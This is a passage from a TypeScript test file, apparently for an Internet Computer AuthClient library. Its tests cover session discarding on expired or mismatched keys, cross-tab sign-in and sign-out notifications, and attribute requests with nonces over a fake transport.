    const key = Ed25519KeyIdentity.fromJSON(JSON.stringify(testSecrets));
    const chain = await createTestDelegation(key, expiration);

    const sessionStorage = createSessionStorage(chain);
    const client = new AuthClient({
      identityStorage: createIdentityStorage(key),
      sessionStorage,
    });
    const identity = await client.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(true);
    // Discarded, not removed: an expired copy here says nothing about a session
    // a sibling origin may still be holding.
    expect(sessionStorage.discard).toHaveBeenCalled();
    expect(sessionStorage.remove).not.toHaveBeenCalled();
  });

  it('discards the session when the stored key does not match the delegation', async () => {
    vi.setSystemTime(new Date('2020-01-01T00:00:00.000Z'));

    // A valid delegation for one key, but a different key persisted — the shape
    // an abandoned redirect re-auth leaves behind (new key beside old
    // delegation). Assembling them would sign with a key the delegation does
    // not authorize, so the session must be discarded, not restored.
    const storedKey = Ed25519KeyIdentity.generate();
    const otherKey = Ed25519KeyIdentity.generate();
    const chainForOther = await createTestDelegation(otherKey);

    const sessionStorage = createSessionStorage(chainForOther);
    const client = new AuthClient({
      identityStorage: createIdentityStorage(storedKey),
      sessionStorage,
    });
    const identity = await client.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(true);
    expect(sessionStorage.discard).toHaveBeenCalled();
    expect(sessionStorage.remove).not.toHaveBeenCalled();
  });
});

describe('AuthClient subscribe', () => {
  it('notifies subscribers and re-derives identity on an external sign-in', async () => {
    const key = Ed25519KeyIdentity.generate();
    const chain = await createTestDelegation(key);
    const ctl = controllableSessionStorage(null);
    // A provided identity lets #reconcile derive the session without an async
    // identity-storage read.
    const client = new AuthClient({ identity: key, sessionStorage: ctl.storage });
    await client.getIdentity();
    expect(client.isAuthenticated()).toBe(false);

    const listener = vi.fn();
    client.subscribe(listener);
    ctl.external(chain); // another tab signs in

    await vi.waitFor(() => expect(listener).toHaveBeenCalled());
    expect(client.isAuthenticated()).toBe(true);
    expect((await client.getIdentity()).getPrincipal().isAnonymous()).toBe(false);
  });

  it('resets to anonymous on an external sign-out', async () => {
    const key = Ed25519KeyIdentity.generate();
    const chain = await createTestDelegation(key);
    const ctl = controllableSessionStorage(chain);
    const client = new AuthClient({ identity: key, sessionStorage: ctl.storage });
    await client.getIdentity();
    expect(client.isAuthenticated()).toBe(true);

    const listener = vi.fn();
    client.subscribe(listener);
    ctl.external(null); // another tab signs out

    await vi.waitFor(() => expect(listener).toHaveBeenCalled());
    expect(client.isAuthenticated()).toBe(false);
    expect((await client.getIdentity()).getPrincipal().isAnonymous()).toBe(true);
  });

  it('stops delivering after unsubscribe', async () => {
    const ctl = controllableSessionStorage(null);
    const client = new AuthClient({ sessionStorage: ctl.storage });
    const listener = vi.fn();
    const unsubscribe = client.subscribe(listener);

    unsubscribe();
    ctl.external(await createTestDelegation(Ed25519KeyIdentity.generate()));
    await new Promise((r) => setTimeout(r, 0));

    expect(listener).not.toHaveBeenCalled();
  });

  it('does not watch storage or change identity until an app subscribes', async () => {
    const ctl = controllableSessionStorage(null);
    const subscribeSpy = vi.spyOn(ctl.storage, 'subscribe');
    const client = new AuthClient({ sessionStorage: ctl.storage });
    await client.getIdentity();

    // With no listener, the client must not watch storage, so an external
    // sign-in cannot flip its identity out from under an app that never opted in.
    expect(subscribeSpy).not.toHaveBeenCalled();
    ctl.external(await createTestDelegation(Ed25519KeyIdentity.generate()));
    await new Promise((r) => setTimeout(r, 0));
    expect((await client.getIdentity()).getPrincipal().isAnonymous()).toBe(true);

    // Registering a listener is what opens the storage subscription.
    client.subscribe(() => {});
    expect(subscribeSpy).toHaveBeenCalledOnce();
  });

  it('notifies subscribers on a local sign-out (via the storage)', async () => {
    // Default storage, so signOut()'s sessionStorage.remove() fires the
    // storage, which drives reconcile → notify — no direct notify in signOut.
    const client = new AuthClient({ idleOptions: { disableIdle: true } });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    expect(client.isAuthenticated()).toBe(true);

    const listener = vi.fn();
    client.subscribe(listener);
    await client.signOut();

    await vi.waitFor(() => expect(listener).toHaveBeenCalled());
    expect(client.isAuthenticated()).toBe(false);
  });
});

describe('AuthClient requestAttributes', () => {
  it('should send a JSON-RPC request and return decoded data and signature', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleRequestAttributes(transport);

    const nonce = new Uint8Array(32).fill(1);
    const result = await client.requestAttributes({
      keys: ['email', 'name'],
      nonce: () => Promise.resolve(nonce),
    });

    const sent = transport.requests[0];
    expect(sent.method).toBe('ii-icrc3-attributes');
    expect(sent.params?.keys).toEqual(['email', 'name']);
    expect(sent.params?.nonce).toBe(btoa(String.fromCharCode(...nonce)));
    expect(Array.from(result.data)).toEqual(Array.from(new TextEncoder().encode('hello')));
    expect(Array.from(result.signature)).toEqual(Array.from(new TextEncoder().encode('sig')));
  });

  it('should use a provided nonce', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleRequestAttributes(transport);

    const nonce = new Uint8Array(32).fill(42);
    await client.requestAttributes({ keys: ['email'], nonce: () => Promise.resolve(nonce) });

    expect(transport.requests[0].params?.nonce).toBe(btoa(String.fromCharCode(...nonce)));
  });

  it('should forward different nonces as distinct base64 values', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleRequestAttributes(transport);

    await client.requestAttributes({
      keys: ['email'],
      nonce: () => Promise.resolve(new Uint8Array(32).fill(1)),
    });
    await client.requestAttributes({
      keys: ['email'],
      nonce: () => Promise.resolve(new Uint8Array(32).fill(2)),
    });

    expect(transport.requests[0].params?.nonce).not.toBe(transport.requests[1].params?.nonce);
  });

  it('should throw when the response contains an error', async () => {
    const client = new AuthClient();
    handleRequestAttributes(FakeTransport.last(), {
      error: { code: -1, message: 'not supported' },
    });

    const nonce = new Uint8Array(32).fill(1);
    await expect(
      client.requestAttributes({ keys: ['email'], nonce: () => Promise.resolve(nonce) }),
    ).rejects.toThrow('not supported');
  });

  it('should throw when the response is missing data or signature', async () => {
    const client = new AuthClient();
    handleRequestAttributes(FakeTransport.last(), { result: { data: btoa('hello') } });

    const nonce = new Uint8Array(32).fill(1);
    await expect(
      client.requestAttributes({ keys: ['email'], nonce: () => Promise.resolve(nonce) }),
    ).rejects.toThrow('Invalid response: missing data or signature');
  });

  it('should accept a nonce callback returning a promise and forward the resolved value', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleRequestAttributes(transport);

    const nonceBytes = new Uint8Array(32).fill(7);
    const result = await client.requestAttributes({
      keys: ['email'],
      nonce: () => Promise.resolve(nonceBytes),
    });

    expect(transport.requests[0].params?.nonce).toBe(btoa(String.fromCharCode(...nonceBytes)));
    expect(Array.from(result.data)).toEqual(Array.from(new TextEncoder().encode('hello')));
  });

  it('should open the transport channel before awaiting a nonce promise', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleRequestAttributes(transport);

    const establishOrder: string[] = [];
    const originalEstablish = transport.establishChannel.bind(transport);
    transport.establishChannel = async () => {
      establishOrder.push('establish');
      return originalEstablish();
    };

    const nonceBytes = new Uint8Array(32).fill(9);
    const noncePromise = new Promise<Uint8Array>((resolve) => {
      // Resolving in a later microtask so the channel has time to open first.
      queueMicrotask(() => {
        establishOrder.push('resolve-nonce');
        resolve(nonceBytes);
      });
    });

    await client.requestAttributes({ keys: ['email'], nonce: () => noncePromise });

    expect(establishOrder).toEqual(['establish', 'resolve-nonce']);
    expect(transport.requests[0].params?.nonce).toBe(btoa(String.fromCharCode(...nonceBytes)));
  });

  it('should propagate rejection from a nonce promise', async () => {
    const client = new AuthClient();
    handleRequestAttributes(FakeTransport.last());

    await expect(
      client.requestAttributes({ keys: ['email'], nonce: () => Promise.reject(new Error('boom')) }),
    ).rejects.toThrow('boom');
  });
});

describe('AuthClient signIn + requestAttributes', () => {
  it('should resolve both when issued in parallel', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleSignIn(transport);
    handleRequestAttributes(transport);

    const [identity, attributes] = await Promise.all([
      client.signIn(),
      client.requestAttributes({
        keys: ['email'],
        nonce: () => Promise.resolve(new Uint8Array(32).fill(1)),
      }),
    ]);

    expect(identity.getPrincipal().isAnonymous()).toBe(false);
    expect(Array.from(attributes.data)).toEqual(Array.from(new TextEncoder().encode('hello')));
  });

  it('should resolve requestAttributes after a completed signIn', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleSignIn(transport);
    handleRequestAttributes(transport);

    const identity = await client.signIn();
    const attributes = await client.requestAttributes({
      keys: ['email'],
      nonce: () => Promise.resolve(new Uint8Array(32).fill(1)),
    });

    expect(identity.getPrincipal().isAnonymous()).toBe(false);
    expect(Array.from(attributes.data)).toEqual(Array.from(new TextEncoder().encode('hello')));
  });

  it('should resolve signIn after a completed requestAttributes', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleSignIn(transport);
    handleRequestAttributes(transport);

    const attributes = await client.requestAttributes({
      keys: ['email'],
      nonce: () => Promise.resolve(new Uint8Array(32).fill(1)),
    });
    const identity = await client.signIn();

    expect(Array.from(attributes.data)).toEqual(Array.from(new TextEncoder().encode('hello')));
    expect(identity.getPrincipal().isAnonymous()).toBe(false);
  });
});
